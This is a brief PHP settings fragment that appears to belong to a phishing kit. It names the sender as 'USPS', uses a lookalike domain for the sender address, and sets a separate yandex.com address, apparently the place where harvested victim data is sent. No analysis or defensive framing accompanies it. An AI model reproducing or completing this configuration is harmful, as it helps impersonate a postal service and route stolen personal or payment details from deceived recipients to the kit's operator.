<?php


$sendername = 'USPS';
$sendermail = 'ngentot@resusps.com';

$YOUR_EMAIL = 'gleem16888@yandex.com';